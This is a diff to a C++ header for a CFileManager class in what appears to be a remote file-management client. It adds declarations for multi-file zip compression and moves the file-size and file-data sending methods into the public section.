@@ -33,6 +33,9 @@ public:
 	UINT SendDriveList();
 	CFileManager(CClientSocket *pClient);
 	virtual ~CFileManager();
+	bool CreateZipArchiveMultiple(const std::vector<CString>& inputPaths, const CString& outputPath);
+	UINT SendFileSize(LPCTSTR lpszFileName);
+	UINT SendFileData(LPBYTE lpBuffer);
 private:
 	bool CreateZipArchive(const CString& inputPath, const CString& outputPath);  
     bool CompressFile(FILE* zipFile, const CString& filePath, const CString& relativePath,   
@@ -55,8 +58,6 @@ private:
 	void StopTransfer(BOOL bIsUpload);
 	UINT SendFilesList(LPCTSTR lpszDirectory);
 	bool DeleteDirectory(LPCTSTR lpszDirectory);
-	UINT SendFileSize(LPCTSTR lpszFileName);
-	UINT SendFileData(LPBYTE lpBuffer);
 	void CreateFolder(LPBYTE lpBuffer);
 	void Rename(LPBYTE lpBuffer);
 	int	 SendToken(BYTE bToken);
@@ -68,6 +69,7 @@ private:
 	void UploadNext();
 	bool OpenFile(LPCTSTR lpFile, INT nShowCmd);
 	void ExeCompress(BYTE* lpBuffer);
+	void ExeCompressMultiple(BYTE* lpBuffer);  
     void SearchFile(LPBYTE lpBuffer);
 protected:
 	static void FileFinderProc(CFileFinder *pFinder, DWORD dwCode, void *pCustomParam);
